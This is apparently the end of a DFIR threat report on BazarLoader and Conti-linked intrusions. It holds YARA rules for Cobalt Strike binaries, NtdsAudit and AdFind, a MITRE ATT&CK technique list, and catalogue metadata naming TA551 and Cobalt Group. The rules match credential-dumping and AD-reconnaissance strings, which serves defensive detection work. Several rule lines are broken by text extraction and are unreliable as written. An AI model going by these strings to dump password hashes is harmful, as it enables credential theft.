\"AVVWSH\" fullword ascii \n   $s8 = \"m1t6h/o*i-j2p2g7i0r.q6j3p,j2l2s7p/s9jq0f9f,i7r2g1h*i8r5h7g/q9j4h*o7i4r9f7f3g*p/q7o1e5n8m1q4n.e+n0i*r/i*k2q-g0p-n+q7l3s6hh6j*q/\" ascii \n   $s9 = \"s-e6m/f-g*j.i8p1g6j*i,o1s9o5f8r-p1l1k4o9n9l-s7q8g+n,f4t0q,f6n9q5s5e6if*e6q-r6g8s1o6r0k+h6p9i4f6p4s6l,g0p1j6l4s1l4h2f,s9p8t5t/g6\" ascii \n   $s10 = \"o1s1s9i2s.f1g5l6g5o2k8h*e9j2o3k0j1f+n,k9h5l*e8p*s2k5r3j-f5o-f,g+e*se9h7e.t0e-h3e2t1f8j5k/m9p6n/j3h9e1k3h.t6h2g1p.l*q8o*t9l6p4s.\" ascii \n\n```\n\n-----\n\n```\n   $s11 k7s9g7m5k4s5o3h6k.s1p.h9k.s o8e f5n9r,l4f s5k3p2f/n1r.i f n\np4s3e7m9p2t/e3m5g1s9e0m1q/j*e*m-r*i+h.p9s2f6h-p5s6e2h8p1s*j.h3p-s.h0\" ascii \n   $s12 = \"k9g9o0t1s4k*k*h.s-p-k.h-m1k*f4h0j7f6n,i5g-n3h+l3n1j7j0e*n5r6ri9i/e1q4m6i3e2o8j9h9e0m.r-i9m*t4j/r.o*l8m4i.t5l,g-h0p6f7l+p-l3l,g.\" ascii \n   $s13 = \"s6k9n/j.s4s5g2p6s.k1t/j6s,s-g*p.n6f9m/g.n4n5j2q6n.f1p/g6n,nj*q.m6e9o/h.m4m5i2r6m.e1p/h6m,m-i*r.p6h9m/e.p4p5l2s6p.h1l/e7p,p-l*s.\" ascii \n   $s14 = \"r4k7g8t-k4o6m,o1s1k.k1s6o,h8k-s4j8q*m+f/i*q/f3mr5j2n0f0i*q0m/e0j5q7n5f4j7q3n7f1m4g2s,g5s5l9h7s9p1o.t8k5r-j3t.k8h1t6r7m-l5h5t1l*\"\nascii \n   $s15 = \"k8s9n7o9k5s5o9m2k0s1m3m.k,s-n+o-f9n9t+t6f4n5o6t2f0n1s/r1f-n-o.t*e8m9is6e4m5t3q5e1m1i5s.e,m-k0s*h8p9q7t9h5p5j8r2h0p1h+r.h,p-q+t-\" ascii \n   $s16 = \"o9g6g0l0s1e6h4p-g6s9s9p1m1k*s3lt5s.f8m5r5f6n+i2j8f*h,p5j2r.h0h1q9i6e8r-i*n8m-r5s-l.i8f2i1k.o4n1t9l6l0g,p9j6f,g.lj*n0o-t-l*p5s-\" ascii \n   $s17 = \"t8n2i3e0i,l.i7i9e8r1j7o0n3i9j0m3ml6e6s9r*l6s5h4t6n7o*k.r1f+r4l/q9g7i3o.m+t9q*g/j0h0e1n*m3i,h.e4n3i5nr9g1h2k6m7j,e,p3p+h2o4f/h4\" ascii \n   $s18 = \"[_^A^A_]\" fullword ascii \n   $s19 = \"k9s9f+j*k3s5o-j/k/s1h/p5k-s-o7j7f7n9t/g+f3n5q/r8f1n1t7g3f+np.g8e7m9s3q4e5m5o+h0e/m1g-h4e+m-m+q0h9p9f/e,h3p5l6e1h/p1o7t,h-p-k+f5\" ascii \n   $s20 = \"g8s9j0t4o,t+n3t1g0k9k1t,o5s0n+t9n6j+o0q2i4j6r1i3f,g+j2h1f2r1ne9m,i2i7f3q4m-n7n4m.r.e1s*j,m5p/n0n6s8p9g/o7l3t+g.m.q.l7g6t,e-o/q.\" ascii \n  condition: \n   uint16(0) == 0x5a4d and filesize < 2000KB and \n   8 of them \n}\nimport \"pe\" \nrule cobalt_strike_exe21 { \n  meta: \n   description = \"files - 21.exe\" \n   author = \"TheDFIRReport\" \n   date = \"2021-07-25\" \n   hash1 = \"972e38f7fa4c3c59634155debb6fb32eebda3c0e8e73f4cb264463708d378c39\" \n  strings: \n   $s1 = \"%c%c%c%c%c%c%c%c%cMSSE-%d-server\" fullword ascii \n   $s2 = \" VirtualQuery failed for %d bytes at address %p\" fullword ascii \n   $s3 =\n\"1brrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrTbrrT\n ascii \n   $s4 = \"\\\\hzA\\\\Vza\\\\|z%\\\\2z/\\\\3z\\\"\\\\/z%\\\\/z8\\\\9z\\\"\\\\\n(zl\\\\3z\\\"\\\\9z4\\\\5z8\\\\|z.\\\\9z+\\\\5z\\\"\\\\qz)\\\\2z(\\\\|z:\\\\=z>\\\\5z-\\\\>z \\\\9z?\\\\QzF\\\\\\\\zL\\\\\"\nfullword ascii \n   $s5 = \"\\\\zL\\\\/z>\\\\qz.\\\\=za\\\\0z-\\\\(z\\\"\\\\\\\\zL\\\\/z>\\\\qz?\\\\,za\\\\?z5\\\\.z\n\\\\\\\\zL\\\\/z>\\\\qz?\\\\,za\\\\0z-\\\\(z\\\"\\\\\\\\zL\\\\/z:\\\\qz*\\\\5zL\\\\\\\\zL\\\\/z:\\\\q\" ascii \n   $s6 = \"\\\\zL:\\\\zL\" fullword ascii \n   $s7 = \"\\\\\\\\z:\\\\\\\\z\" fullword ascii \n   $s8 = \"\\\\qz/\\\\3z!\\\\,z%\\\\0z)\\\\8zl\\\\tzc\\\\?z \\\\.ze\\\\|z*\\\\)z\\\"\\\\?\nz8\\\\5z#\\\\2zl\\\\:z>\\\\3z!\\\\|z-\\\\|z\\\"\\\\=z8\\\\5z:\\\\9zl\\\\?z#\\\\2z?\\\\(z>\\\\)z/\\\\(z#\" ascii \n   $s9 = \"qz<\\\\%zL\\\\\\\\zL\\\\9z?\\\\qz?\\\\*zL\\\\\\\\zL\\\\9z?\\\\qz9\\\\%zL\\\\\\\\zL\\\\9z?\n\\\\qz:\\\\9zL\\\\\\\\zL\\\\9z8\\\\qz)\\\\9zL\\\\\\\\zL\\\\9z9\\\\qz)\\\\/zL\\\\\\\\zL\\\\:z-\\\\qz\" ascii \n   $s10 = \"zL\\\\\\\\zL\\\\0z:\\\\qz\" fullword ascii \n   $s11 = \"z-\\\\(z\\\"\\\\\\\\zL\\\\/z:\\\\qz\" fullword ascii \n   $s12 = \" VirtualProtect failed with code 0x%x\" fullword ascii \n\n```\n\n-----\n\n```\n   $s13 3\\\\)z \\\\\\\\zL\\\\>z)\\\\\\\\zL\\\\/z\n\\\\\\\\zL\\\\9z8\\\\\\\\zL\\\\0z:\\\\\\\\zL\\\\0z8\\\\\\\\zL\\\\:z\\\\\\\\zL\\\\*z%\\\\\\\\zL\\\\4z5\\\\\\\\zL\\\\=z6\\\\\\\\zL\\\\9z9\\\\\\\\zL\\\\1z'\" ascii \n   $s14 = \"z#\\\\\\\\zL\\\\,z\n\\\\\\\\zL\\\\,z8\\\\\\\\zL\\\\.z#\\\\\\\\zL\\\\.z9\\\\\\\\zL\\\\4z>\\\\\\\\zL\\\\/z'\\\\\\\\zL\\\\/z=\\\\\\\\zL\\\\/z:\\\\\\\\zL\\\\\n(z$\\\\\\\\zL\\\\(z>\\\\\\\\zL\\\\)z>\\\\\\\\z\" ascii \n   $s15 = \"qz \\\\5zL\\\\\\\\zL\\\\8z)\\\\qz \\\\)zL\\\\\\\\zL\\\\8z%\\\\*za\\\\1z:\\\\\\\\zL\\\\9z\n\\\\qz+\\\\.zL\\\\\\\\zL\\\\9z\\\"\\\\qz-\\\\)zL\\\\\\\\zL\\\\9z\\\"\\\\qz.\\\\&zL\\\\\\\\zL\\\\9z\\\"\" ascii \n   $s16 = \"qz<\\\\7zL\\\\\\\\zL\\\\)z6\\\\qz9\\\\&za\\\\?z5\\\\.z \\\\\\\\zL\\\\)z6\\\\qz9\\\\&za\\\\0z-\\\\\n(z\\\"\\\\\\\\zL\\\\*z%\\\\qz:\\\\2zL\\\\\\\\zL\\\\$z$\\\\qz6\\\\=zL\\\\\\\\zL\\\\&z$\\\\qz\" ascii \n   $s17 = \"qz'\\\\.zL\\\\\\\\zL\\\\7z5\\\\qz'\\\\;zL\\\\\\\\zL\\\\0z8\\\\qz \\\\(zL\\\\\\\\zL\\\\0z:\\\\qz\n\\\\*zL\\\\\\\\zL\\\\1z%\\\\qz\\\"\\\\&zL\\\\\\\\zL\\\\1z'\\\\qz!\\\\7zL\\\\\\\\zL\\\\1z \\\\q\" ascii \n   $s18 = \"]zL\\\\=z*\\\\qz6\\\\=zL\\\\\\\\zL\\\\=z>\\\\qz\\\\9zL\\\\\\\\zL\\\\=z>\\\\qz.\\\\4zL\\\\\\\\zL\\\\=z>\\\\qz(\\\\&zL\\\\\\\\zL\\\\=z>\\\\qz)\\\\;zL\\\\\\\\zL\\\\=z>\\\\qz%\\\\\nzL\\\\\\\\z\" ascii \n   $s19 = \" Unknown pseudo relocation protocol version %d.\" fullword ascii \n   $s20 = \"\\\\L*L\\\\]qN\\\\WHKl]qO\\\\W{j\\\\XJL\\\\][G\\\\}\" fullword ascii \n  condition: \n   uint16(0) == 0x5a4d and filesize < 800KB and\n(pe.imphash()==\"17b461a082950fc6332228572138b80c\" or \n8 of them) \n}\nrule informational_NtdsAudit_AD_Audit_Tool { \n  meta: \n   description = \"files - NtdsAudit.exe\" \n   author = \"TheDFIRReport\" \n   date = \"2021-07-25\" \n   hash1 = \"fb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b\" \n  strings: \n   $x1 = \"WARNING: Use of the --pwdump option will result in decryption of\npassword hashes using the System Key.\" fullword wide \n   $s2 = \"costura.nlog.dll.compressed\" fullword wide \n   $s3 = \"costura.microsoft.extensions.commandlineutils.dll.compressed\" fullword\nwide \n   $s4 = \"Password hashes have only been dumped for the \\\"{0}\\\" domain.\" fullword\nwide \n   $s5 = \"The NTDS file contains user accounts with passwords stored using\nreversible encryption. Use the --dump-reversible option to outp\" wide \n   $s6 = \"costura.system.valuetuple.dll.compressed\" fullword wide \n   $s7 =\n\"TargetRNtdsAudit.NTCrypto.#DecryptDataUsingAes(System.Byte[],System.Byte[],System.Byt\n fullword ascii \n   $s8 = \"c:\\\\Code\\\\NtdsAudit\\\\src\\\\NtdsAudit\\\\obj\\\\Release\\\\NtdsAudit.pdb\"\nfullword ascii \n   $s9 = \"NtdsAudit.exe\" fullword wide \n   $s10 = \"costura.esent.interop.dll.compressed\" fullword wide \n   $s11 = \"costura.costura.dll.compressed\" fullword wide \n   $s12 = \"costura.registry.dll.compressed\" fullword wide \n   $s13 = \"costura.nfluent.dll.compressed\" fullword wide \n   $s14 = \"dumphashes\" fullword ascii \n   $s15 = \"The path to output hashes in pwdump format.\" fullword wide \n   $s16 = \"Microsoft.Extensions.CommandLineUtils\" fullword ascii \n   $s17 = \"If you require password hashes for other domains, please obtain the\nNTDS and SYSTEM files for each domain.\" fullword wide \n\n```\n\n-----\n\n```\n   $s18 microsoft.extensions.commandlineutils fullword wide \n   $s19 = \"-p | --pwdump <file>\" fullword wide \n   $s20 = \"get_ClearTextPassword\" fullword ascii \n  condition: \n   uint16(0) == 0x5a4d and filesize < 2000KB and \n   1 of ($x*) and 4 of them \n}\nrule informational_AdFind_AD_Recon_and_Admin_Tool {\n  meta: \n   description = \"files - AdFind.exe\" \n   author = \"TheDFIRReport\" \n   date = \"2021-07-25\" \n   hash1 = \"b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682\" \n  strings: \n   $s1 = \"  -sc dumpugcinfo     Dump info for users/computers that have used\nUGC\" fullword ascii \n   $s2 = \"  -sc computers_pwdnotreqd Dump computers set with password not\nrequired.\" fullword ascii \n   $s3 = \"  -sc computers_inactive Dump computers that are disabled or password\nlast set\" fullword ascii \n   $s4 = \"  -sc computers_active  Dump computers that are enabled and password\nlast\" fullword ascii \n   $s5 = \"  -sc ridpool       Dump Decoded Rid Pool Info\" fullword ascii\n   $s6 = \"   Get top 10 quota users in decoded format\" fullword ascii \n   $s7 = \"  -po      Print options. This switch will dump to the command\nline\" fullword ascii \n   $s8 = \"ERROR: Couldn't properly encode password - \" fullword ascii \n   $s9 = \"  -sc users_accexpired  Dump accounts that are expired (NOT password\nexpiration).\" fullword ascii \n   $s10 = \"  -sc users_disabled   Dump disabled users.\" fullword ascii \n   $s11 = \"  -sc users_pwdnotreqd  Dump users set with password not required.\"\nfullword ascii \n   $s12 = \"  -sc users_noexpire   Dump non-expiring users.\" fullword ascii \n   $s13 = \"  adfind -default -rb ou=MyUsers -objfilefolder c:\\\\temp\\\\ad_out\"\nfullword ascii \n   $s14 = \"   Dump all Exchange objects and their SMTP proxyaddresses\" fullword\nascii \n   $s15 = \"WLDAP32.DLL\" fullword ascii \n   $s16 = \"AdFind.exe\" fullword ascii \n   $s17 = \"          duration attributes that will be decoded by the tdc* switches.\" fullword ascii \n   $s18 = \"  -int8time- xx Remove attribute(s) from list to be decoded as int8.\nSemicolon delimited.\" fullword ascii \n   $s19 = \"replTopologyStayOfExecution\" fullword ascii\n   $s20 = \"%s: [%s] Error 0x%0x (%d) - %s\" fullword ascii \n  condition: \n   uint16(0) == 0x5a4d and filesize < 4000KB and \n   8 of them \n}\n\n### MITRE\n\n Phishing – T1566\n\n```\n\n-----\n\n### Spearphishing Attachment – T1566.001 Domain Accounts – T1078.002 Command and Scripting Interpreter – T1059 User Execution – T1204 PowerShell – T1059.001 Windows Command Shell – T1059.003 Malicious File – T1204.002 Create Account – T1136 Valid Accounts – T1078 Local Account – T1087.001 Process Injection – T1055 Process Hollowing – T1055.012 Signed Binary Proxy Execution – T1218 Rundll32 – T1218.011 OS Credential Dumping – T1003 LSASS Memory – T1003.001 Cached Domain Credentials – T1003.005 Domain Trust Discovery – T1482 Account Discovery – T1087 File and Directory Discovery – T1083 Process Discovery – T1057 Network Share Discovery – T1135 Remote System Discovery – T1018 Software Discovery – T1518 System Owner/User Discovery – T1033 System Time Discovery – T1124 Lateral Tool Transfer – T1570 Remote Services – T1021 Remote Desktop Protocol – T1021.001 SMB/Windows Admin Shares – T1021.002 Windows Remote Management – T1021.006 Data from Local System – T1005 Data from Network Shared Drive – T1039 Data Staged – T1074 Local Data Staging – T1074.001 Remote Data Staging – T1074.002\n\n Internal case #5426\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-04 - BazarLoader and the Conti Leaks.pdf"
    ],
    "report_names": [
        "2021-10-04 - BazarLoader and the Conti Leaks.pdf"
    ],
    "threat_actors": [
        {
            "id": "26a04131-2b8c-4e5d-8f38-5c58b86f5e7f",
            "created_at": "2022-10-25T15:50:23.579601Z",
            "updated_at": "2025-03-27T02:00:55.50292Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "TA551",
                "GOLD CABIN",
                "Shathak"
            ],
            "source_name": "MITRE:TA551",
            "tools": [
                "QakBot",
                "IcedID",
                "Valak",
                "Ursnif"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04e34cab-3ee4-4f06-a6f6-5cdd7eccfd68",
            "created_at": "2022-10-25T16:07:24.578896Z",
            "updated_at": "2025-03-27T02:02:10.286803Z",
            "deleted_at": null,
            "main_name": "TA551",
            "aliases": [
                "Gold Cabin",
                "Monster Libra",
                "Shathak",
                "TA551"
            ],
            "source_name": "ETDA:TA551",
            "tools": [
                "BokBot",
                "CRM",
                "Gozi",
                "Gozi CRM",
                "IceID",
                "IcedID",
                "Papras",
                "Snifula",
                "Ursnif",
                "Valak",
                "Valek"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535539,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1653761063,
    "ts_modification_date": 1653761063,
    "files": {
        "pdf": "https://archive.orkl.eu/caeaf80826ff5696f2bb643dd963bb3dd50afdc8.pdf",
        "text": "https://archive.orkl.eu/caeaf80826ff5696f2bb643dd963bb3dd50afdc8.txt",
        "img": "https://archive.orkl.eu/caeaf80826ff5696f2bb643dd963bb3dd50afdc8.jpg"
    }
}